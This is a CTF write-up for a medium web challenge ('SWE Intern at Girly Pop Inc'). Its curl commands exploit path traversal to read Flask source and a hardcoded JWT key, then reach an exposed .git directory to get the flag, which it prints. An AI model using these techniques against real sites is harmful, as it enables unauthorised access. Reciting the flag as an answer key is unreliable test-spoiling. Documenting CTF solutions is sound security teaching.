---
ctf: ScarletCTF 2026
category: web
difficulty: medium
points: 200
flag: RUSEC{a1way$_1gnor3_3nv_f1l3s_up47910k390cyhu623}
techniques:
  - path-traversal
  - git-repo-extraction
  - lfi
tools:
  - curl
  - git-dumper
---

# SWE Intern at Girly Pop Inc

## Description

Last week we fired an intern at Girlie Pop INC for stealing too much food from the office. It seems they didn't know much about secure software development either...

**URL:** `https://girly.ctf.rusec.club`

## Solution

### Step 1: Initial Reconnaissance

The main page shows a JWT Studio application with navigation links:
- `/view?page=docs.html` - API Documentation  
- `/view?page=about.html` - System Status

The docs mention the `/view` endpoint is "restricted to the static directory for security." The System Status page mentions "Automated via Git-Hooks" deployment.

### Step 2: Exploit Path Traversal

The `/view` endpoint is vulnerable to path traversal:

```bash
curl "https://girly.ctf.rusec.club/view?page=../app.py"
```

This returns the Flask source code revealing:

**JWT Key Found:** `f0und_my_k3y_1_gu3$$`

This key could be used to forge JWT tokens with arbitrary claims (e.g., `role: admin`), but no protected endpoints exist in this challenge.

### Step 3: Enumerate Git Repository

The "Git-Hooks" hint suggests a `.git` directory might be exposed:

```bash
curl "https://girly.ctf.rusec.club/.git/HEAD"
```

This confirms the Git repo is accessible.

### Step 4: Extract the Flag

The intern committed sensitive files to the repository. Read the README:

```bash
curl "https://girly.ctf.rusec.club/.git/../README.md"
```

Output contains the flag directly.

## Key Vulnerabilities

1. **Path Traversal (CWE-22):** The `/view` endpoint fails to validate the `page` parameter
2. **Exposed Git Repository:** The `.git` directory is web-accessible
3. **Hardcoded Secrets:** JWT secret key in source code
4. **Sensitive Data in Git:** The flag was committed to README.md

